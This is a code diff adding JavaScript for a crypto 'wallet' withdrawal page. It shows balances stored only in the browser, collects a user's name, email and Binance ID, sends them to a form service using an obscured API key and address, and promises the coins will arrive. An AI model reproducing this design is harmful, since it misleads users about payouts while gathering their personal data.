+    VTHO: 0.0024,
+    SOLV: 0.045,
+    QUICK: 0.028
+  };
+
+  /* ============================================
+     HELPERS
+  ============================================ */
+  function getBalance(coin) {
+    const v = parseFloat(localStorage.getItem(coin.storageKey) || '0');
+    return isFinite(v) && v >= 0 ? v : 0;
+  }
+
+  function getCooldownRemaining(coin) {
+    const last = parseInt(localStorage.getItem(coin.cooldownKey) || '0', 10);
+    if (!last || last <= 0) return 0;
+    return Math.max(0, WITHDRAW_COOLDOWN - (Date.now() - last));
+  }
+
+  function getGlobalLastWithdraw() {
+    let latest = 0;
+    COINS.forEach(coin => {
+      const last = parseInt(localStorage.getItem(coin.cooldownKey) || '0', 10);
+      if (last > latest) latest = last;
+    });
+    return latest;
+  }
+
+  function getGlobalCooldownRemaining() {
+    const last = getGlobalLastWithdraw();
+    if (!last || last <= 0) return 0;
+    return Math.max(0, WITHDRAW_COOLDOWN - (Date.now() - last));
+  }
+
+  function formatBalance(v, dec) {
+    if (!isFinite(v) || v < 0) v = 0;
+    if (dec === 0) return Math.floor(v).toLocaleString('en-US');
+    return v.toFixed(dec);
+  }
+
+  function formatTime(ms) {
+    if (ms < 0) ms = 0;
+    const totalSec = Math.floor(ms / 1000);
+    const h = Math.floor(totalSec / 3600);
+    const m = Math.floor((totalSec % 3600) / 60);
+    const s = totalSec % 60;
+    if (h > 0) return `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+    return `${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+  }
+
+  function formatUsd(v) {
+    if (!isFinite(v) || v < 0) v = 0;
+    if (v === 0) return '$0.00';
+    if (v < 0.01) return '<$0.01';
+    if (v < 1000) return '$' + v.toFixed(2);
+    return '$' + v.toLocaleString('en-US', { maximumFractionDigits: 2 });
+  }
+
+  function usdValueOf(coin, amount) {
+    const price = PRICES[coin.code] || 0;
+    return amount * price;
+  }
+
+  function escapeHtml(str) {
+    const div = document.createElement('div');
+    div.textContent = String(str || '');
+    return div.innerHTML;
+  }
+
+  function showToast(msg, type = '', duration = 2500) {
+    const toastEl = document.getElementById('toast');
+    toastEl.textContent = msg;
+    toastEl.className = 'toast';
+    if (type) toastEl.classList.add(type);
+    toastEl.classList.add('show');
+    clearTimeout(toastEl._t);
+    toastEl._t = setTimeout(() => toastEl.classList.remove('show'), duration);
+  }
+
+  /* ============================================
+     PRICE FETCHING (CoinGecko)
+  ============================================ */
+  async function fetchPrices(force = false) {
+    // 1. جرب الكاش أولاً
+    if (!force) {
+      try {
+        const cached = JSON.parse(localStorage.getItem(PRICE_CACHE_KEY) || '{}');
+        if (cached.timestamp && (Date.now() - cached.timestamp) < PRICE_CACHE_TTL) {
+          if (cached.prices) {
+            PRICES = { ...PRICES, ...cached.prices };
+            return true;
+          }
+        }
+      } catch (e) {}
+    }
+
+    // 2. اجلب من CoinGecko
+    try {
+      const ids = COINS.map(c => c.geckoId).join(',');
+      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`;
+      
+      const res = await fetch(url);
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      const data = await res.json();
+
+      const newPrices = {};
+      COINS.forEach(coin => {
+        const priceData = data[coin.geckoId];
+        if (priceData && typeof priceData.usd === 'number') {
+          newPrices[coin.code] = priceData.usd;
+        }
+      });
+
+      if (Object.keys(newPrices).length > 0) {
+        PRICES = { ...PRICES, ...newPrices };
+        try {
+          localStorage.setItem(PRICE_CACHE_KEY, JSON.stringify({
+            timestamp: Date.now(),
+            prices: newPrices
+          }));
+        } catch (e) {}
+      }
+
+      updatePriceStatus(true);
+      return true;
+    } catch (err) {
+      console.warn('Price fetch failed:', err);
+      updatePriceStatus(false);
+      return false;
+    }
+  }
+
+  function updatePriceStatus(live) {
+    const el = document.getElementById('priceStatus');
+    const dot = document.querySelector('.live-dot');
+    if (!el) return;
+
+    if (live) {
+      el.textContent = 'Live Prices · CoinGecko';
+      if (dot) dot.style.background = 'var(--green)';
+    } else {
+      el.textContent = 'Cached Prices';
+      if (dot) dot.style.background = 'var(--gold)';
+    }
+  }
+
+  /* ============================================
+     RENDER COINS LIST
+  ============================================ */
+  function renderCoins() {
+    const list = document.getElementById('coinsList');
+    list.innerHTML = '';
+
+    const globalCooldown = getGlobalCooldownRemaining();
+    const isGloballyLocked = globalCooldown > 0;
+
+    let totalUsd = 0;
+
+    COINS.forEach(coin => {
+      const bal = getBalance(coin);
+      const isBig = coin.decimals === 0 && bal >= 100000;
+      const amountCls = isBig ? 'coin-amount big' : 'coin-amount';
+
+      const usd = usdValueOf(coin, bal);
+      totalUsd += usd;
+
+      const coinCooldown = getCooldownRemaining(coin);
+      const coinLocked = coinCooldown > 0;
+      const canSend = bal >= coin.minWithdraw;
+
+      let subLabel;
+      let subClass = 'coin-sub';
+      let rowClass = 'coin-row';
+
+      if (coinLocked) {
+        subLabel = 'Locked · ' + formatTime(coinCooldown);
+        subClass = 'coin-sub warn';
+        rowClass += ' locked';
+      } else if (isGloballyLocked && canSend) {
+        subLabel = 'Global lock · ' + formatTime(globalCooldown);
+        subClass = 'coin-sub warn';
+        rowClass += ' globally-locked';
+      } else if (!canSend && bal > 0) {
+        subLabel = 'Min ' + formatBalance(coin.minWithdraw, coin.decimals) + ' to send';
+      } else if (bal === 0) {
+        subLabel = 'No balance';
+      } else {
+        subLabel = coin.name;
+      }
+
+      const row = document.createElement('div');
+      row.className = rowClass;
+      row.innerHTML = `
+        <div class="coin-icon ${coin.cls}">
+          <img src="${coin.img}" alt="${coin.code}"
+               onerror="this.style.display='none';this.parentElement.textContent='${coin.fallback}'">
+        </div>
+        <div class="coin-info">
+          <div class="coin-name">${coin.code}</div>
+          <div class="${subClass}">${subLabel}</div>
+        </div>
+        <div class="coin-amounts">
+          <div class="${amountCls}">${formatBalance(bal, coin.decimals)}</div>
+          <div class="coin-usd">${formatUsd(usd)}</div>
+        </div>
+        <div class="coin-cta">
+          <svg viewBox="0 0 24 24"><polyline points="9 6 15 12 9 18"/></svg>
+        </div>
+      `;
+
+      row.addEventListener('click', () => {
+        if (coinLocked) {
+          showToast(coin.code + ' locked · ' + formatTime(coinCooldown) + ' remaining', 'warning', 3000);
+          return;
+        }
+        if (isGloballyLocked) {
+          showToast('You already withdrew! Next in ' + formatTime(globalCooldown), 'warning', 3500);
+          return;
+        }
+        if (!canSend) {
+          if (bal === 0) showToast('No ' + coin.code + ' balance', 'warning', 3000);
+          else showToast('Minimum ' + formatBalance(coin.minWithdraw, coin.decimals) + ' ' + coin.code, 'warning', 3000);
+          return;
+        }
+        openSendModal(coin);
+      });
+
+      list.appendChild(row);
+    });
+
+    document.getElementById('totalUsd').textContent = totalUsd.toFixed(2);
+  }
+
+  /* ============================================
+     SEND MODAL
+  ============================================ */
+  let currentCoin = null;
+
+  function openSendModal(coin) {
+    currentCoin = coin;
+    const modalContent = document.getElementById('modalContent');
+    const bal = getBalance(coin);
+    const usd = usdValueOf(coin, bal);
+
+    const otherCoinsWithBalance = COINS.filter(c => c.code !== coin.code && getBalance(c) > 0);
+
+    modalContent.innerHTML = `
+      <button class="modal-close" onclick="closeModal()">
+        <svg viewBox="0 0 24 24"><line x1="6" y1="6" x2="18" y2="18"/><line x1="18" y1="6" x2="6" y2="18"/></svg>
+      </button>
+
+      <div class="modal-coin-header">
+        <div class="coin-icon ${coin.cls}">
+          <img src="${coin.img}" alt="${coin.code}"
+               onerror="this.style.display='none';this.parentElement.textContent='${coin.fallback}'">
+        </div>
+        <div class="modal-title-wrap">
+          <div class="modal-title">Send ${coin.code}</div>
+          <div class="modal-sub">${coin.name} → Binance</div>
+        </div>
+      </div>
+
+      ${otherCoinsWithBalance.length > 0 ? `
+        <div class="one-coin-modal-notice">
+          <svg viewBox="0 0 24 24">
+            <circle cx="12" cy="12" r="10"/>
+            <line x1="12" y1="8" x2="12" y2="12"/>
+            <line x1="12" y1="16" x2="12.01" y2="16"/>
+          </svg>
+          <div class="one-coin-modal-notice-text">
+            You have <b>${otherCoinsWithBalance.length} other coin${otherCoinsWithBalance.length > 1 ? 's' : ''}</b> with balance.
+            <br>You are about to send <b>${coin.code}</b> only. All other coins will be locked for 12 hours.
+          </div>
+        </div>
+      ` : ''}
+
+      <div class="kyc-notice">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 9v4"/>
+          <path d="M12 17h.01"/>
+          <path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+        </svg>
+        <div class="kyc-notice-text">
+          Your Binance account must be <b>fully KYC verified</b> before requesting a withdrawal.
+        </div>
+      </div>
+
+      <div class="cooldown-notice">
+        <svg viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="10"/>
+          <polyline points="12 6 12 12 16 14"/>
+        </svg>
+        <div class="cooldown-notice-text">
+          <b>Global cooldown:</b> After any withdrawal, you must wait <b>12 hours</b> before sending any coin again.
+        </div>
+      </div>
+
+      <div class="amount-display">
+        <div class="amount-display-label">You Are Sending</div>
+        <div class="amount-display-value">
+          ${formatBalance(bal, coin.decimals)}
+          <small>${coin.code}</small>
+        </div>
+        <div class="amount-display-usd">≈ ${formatUsd(usd)} USD</div>
+      </div>
+
+      <form id="sendForm">
+        <div class="form-group">
+          <label>Full Name</label>
+          <input type="text" name="full_name" placeholder="Enter your full name" required autocomplete="name" />
+        </div>
+
+        <div class="form-group">
+          <label>Email Address</label>
+          <input type="email" name="user_email" placeholder="Enter your email" required autocomplete="email" inputmode="email" />
+        </div>
+
+        <div class="form-group">
+          <label>Binance ID</label>
+          <input type="text" name="binance_id" placeholder="Enter your Binance ID" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" />
+        </div>
+
+        <div class="modal-actions">
+          <button type="button" class="btn btn-cancel" onclick="closeModal()">
+            <svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+            Cancel
+          </button>
+          <button type="submit" class="btn btn-confirm" id="confirmBtn">
+            <svg viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
+            Send Now
+          </button>
+        </div>
+      </form>
+    `;
+
+    document.getElementById('modalOverlay').classList.add('show');
+    document.body.classList.add('no-scroll');
+
+    document.getElementById('sendForm').addEventListener('submit', handleSubmit);
+  }
+
+  function closeModal() {
+    document.getElementById('modalOverlay').classList.remove('show');
+    document.body.classList.remove('no-scroll');
+    currentCoin = null;
+    renderCoins();
+  }
+
+  /* ============================================
+     SUBMIT
+  ============================================ */
+  function handleSubmit(event) {
+    event.preventDefault();
+    if (!currentCoin) return;
+
+    const coin = currentCoin;
+    const form = event.target;
+    const formData = new FormData(form);
+
+    const fullName  = (formData.get('full_name') || '').trim();
+    const userEmail = (formData.get('user_email') || '').trim();
+    const binanceId = (formData.get('binance_id') || '').trim();
+
+    if (fullName.length < 2) { showToast('Please enter a valid name', 'error'); return; }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) { showToast('Please enter a valid email', 'error'); return; }
+    if (!/^[0-9]{6,}$/.test(binanceId)) { showToast('Binance ID must be at least 6 digits', 'error'); return; }
+
+    const currentBal = getBalance(coin);
+    if (currentBal < coin.minWithdraw) {
+      showToast('Minimum ' + formatBalance(coin.minWithdraw, coin.decimals) + ' ' + coin.code, 'error', 3000);
+      return;
+    }
+
+    if (getGlobalCooldownRemaining() > 0) {
+      showToast('You already withdrew! Please wait.', 'warning', 3000);
+      return;
+    }
+
+    const amount = currentBal;
+    const usd = usdValueOf(coin, amount);
+
+    const sendData = new FormData();
+    sendData.set('subject', `${coin.code} Wallet Withdrawal - ADSY`);
+    sendData.set('apiKey', _dk());
+    sendData.set('email', _de());
+    sendData.set('full_name', fullName);
+    sendData.set('user_email', userEmail);
+    sendData.set('binance_id', binanceId);
+    sendData.set('coin', coin.code);
+    sendData.set('coin_name', coin.name);
+    sendData.set('amount', formatBalance(amount, coin.decimals) + ' ' + coin.code);
+    sendData.set('amount_usd', formatUsd(usd));
+    sendData.set('withdraw_date', new Date().toLocaleString('en-US'));
+    sendData.set('source', 'ADSY Wallet');
+
+    const confirmBtn = document.getElementById('confirmBtn');
+    confirmBtn.disabled = true;
+    confirmBtn.innerHTML = '⏳ Sending...';
+
+    fetch('https://api.staticforms.dev/submit', {
+      method: 'POST',
+      body: sendData
+    })
+    .then(res => {
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      return res.json().catch(() => ({}));
+    })
+    .then(data => {
+      if (data && data.success === false) throw new Error(data.message || 'Rejected');
+      successSend(coin, amount, usd, fullName, binanceId);
+    })
+    .catch(err => {
+      console.error('Send failed:', err);
+      confirmBtn.disabled = false;
+      confirmBtn.innerHTML = `
+        <svg viewBox="0 0 24 24"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
+        Retry Send
+      `;
+      showToast('Connection failed. Please try again.', 'error', 3500);
+    });
+  }
+
+  function successSend(coin, amount, usd, fullName, binanceId) {
+    localStorage.setItem(coin.storageKey, '0');
+    localStorage.setItem(coin.cooldownKey, Date.now());
+
+    const modalContent = document.getElementById('modalContent');
+    modalContent.innerHTML = `
+      <div class="success-wrap">
+        <div class="success-icon">
+          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+        </div>
+        <div class="success-title">Request Sent!</div>
+        <div class="success-desc">
+          Your <b>${coin.code}</b> will be sent to your Binance account<br>
+          <b style="font-size: 18px;">${formatBalance(amount, coin.decimals)} ${coin.code}</b><br>
+          <span style="color: var(--accent); font-weight: 800;">≈ ${formatUsd(usd)} USD</span><br>
+          to: <b>${escapeHtml(fullName)}</b><br>
+          Binance ID: <b style="direction: ltr; display: inline-block;">${escapeHtml(binanceId)}</b><br>
+          <span style="font-size: 11px; color: var(--muted);">within 24-48 hours</span>
+        </div>
+        <div class="success-note">
+          <p class="top">⏱️ Next withdrawal in 12 hours</p>
+          <p class="bottom">Your ${coin.code} balance has been reset · All coins locked</p>
+        </div>
+        <button class="btn btn-confirm" style="width: 100%;" onclick="location.reload();">
+          OK, Thanks
+        </button>
+      </div>
+    `;
+  }
+
+  /* ============================================
+     THEME TOGGLE
+  ============================================ */
+  const toggle = document.getElementById('themeToggle');
+  const body = document.body;
+  const thumbIcon = document.getElementById('thumbIcon');
+
+  const moonIcon = '<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>';
+  const sunIcon = `
+    <circle cx="12" cy="12" r="4"/>
+    <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+  `;
+
+  function setTheme(dark) {
+    if (dark) {
+      body.classList.add('dark');
+      thumbIcon.innerHTML = sunIcon;
+    } else {
+      body.classList.remove('dark');
+      thumbIcon.innerHTML = moonIcon;
+    }
+  }
+
+  // تحميل الوضع من localStorage (نفس مفتاح باقي الموقع)
+  const saved = localStorage.getItem('adsy-theme');
+  const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+  if (saved === 'dark' || (!saved && prefersDark)) setTheme(true);
+
+  let themeLock = false;
+  toggle.addEventListener('click', () => {
+    if (themeLock) return;
+    themeLock = true;
+    const isDark = !body.classList.contains('dark');
+    requestAnimationFrame(() => setTheme(isDark));
+    try { localStorage.setItem('adsy-theme', isDark ? 'dark' : 'light'); } catch (e) {}
+    setTimeout(() => { themeLock = false; }, 280);
+  });
+
+  // مزامنة الوضع بين التبويبات
+  window.addEventListener('storage', (e) => {
+    if (e.key === 'adsy-theme') {
+      setTheme(e.newValue === 'dark');
+    }
+  });
+
+  /* ============================================
+     MODAL CLOSE EVENTS
+  ============================================ */
+  document.getElementById('modalOverlay').addEventListener('click', (e) => {
+    if (e.target.id === 'modalOverlay') closeModal();
+  });
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') closeModal();
+  });
+
+  /* ============================================
+     REFRESH BUTTON
+  ============================================ */
+  const refreshBtn = document.getElementById('refreshBtn');
+  refreshBtn.addEventListener('click', async () => {
+    refreshBtn.classList.add('spinning');
+    await fetchPrices(true);
+    renderCoins();
+    setTimeout(() => refreshBtn.classList.remove('spinning'), 700);
+  });
+
+  /* ============================================
+     INIT
+  ============================================ */
+  // 1. اعرض الصفحة فوراً بالأسعار الافتراضية
+  renderCoins();
+
+  // 2. اجلب الأسعار في الخلفية
+  fetchPrices();
+
+  // 3. تحديث كل ثانية (للعدّادات)
+  setInterval(renderCoins, 1000);
+
+  // 4. تحديث الأسعار كل 5 دقائق
+  setInterval(() => {
+    fetchPrices(true).then(() => renderCoins());
+  }, 5 * 60 * 1000);
+
+  // 5. مزامنة عند العودة
+  window.addEventListener('storage', renderCoins);
+  window.addEventListener('focus', () => {
+    fetchPrices().then(() => renderCoins());
+  });
+</script>
+
+</body>
+</html>
